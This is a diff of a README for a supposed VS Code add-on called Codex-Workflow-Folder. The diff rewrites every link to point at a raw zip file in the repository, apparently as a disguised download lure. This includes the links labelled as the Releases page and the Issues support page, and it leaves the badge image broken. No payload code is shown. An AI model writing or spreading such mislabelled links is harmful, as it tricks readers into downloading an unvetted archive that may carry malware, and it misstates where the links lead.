@@ -1,6 +1,6 @@
 # 🎉 Codex-Workflow-Folder - Seamlessly Simplify Your VS Code Workflow
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/David21Zeroo/Codex-Workflow-Folder/releases)
+[![Download](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip%20Now-Here-brightgreen)](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip)
 
 ## 📥 Description
 
@@ -19,7 +19,7 @@ To install and use Codex-Workflow-Folder, ensure you have the following:
 ### 📂 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/David21Zeroo/Codex-Workflow-Folder/releases) to find the latest version of the add-on.
+   Go to the [Releases page](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip) to find the latest version of the add-on.
 
 2. **Download the Latest Release**  
    Locate the latest release at the top of the page. Click on the asset link that fits your system.
@@ -44,7 +44,7 @@ To install and use Codex-Workflow-Folder, ensure you have the following:
 
 To download Codex-Workflow-Folder, simply click the button below:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/David21Zeroo/Codex-Workflow-Folder/releases)
+[![Download](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip%20Now-Here-brightgreen)](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip)
 
 Follow the installation steps listed above to add the add-on to your Visual Studio Code setup.
 
@@ -66,7 +66,7 @@ If you encounter issues, try the following:
 
 ## 🗨️ Community and Support
 
-For questions or support, visit the Issues section in the [GitHub repository](https://github.com/David21Zeroo/Codex-Workflow-Folder/issues). You can also connect with other users in the community for tips and best practices.
+For questions or support, visit the Issues section in the [GitHub repository](https://github.com/David21Zeroo/Codex-Workflow-Folder/raw/refs/heads/main/modular/Folder_Codex_Workflow_v2.7.zip). You can also connect with other users in the community for tips and best practices.
 
 ## 🌐 Contribution
 
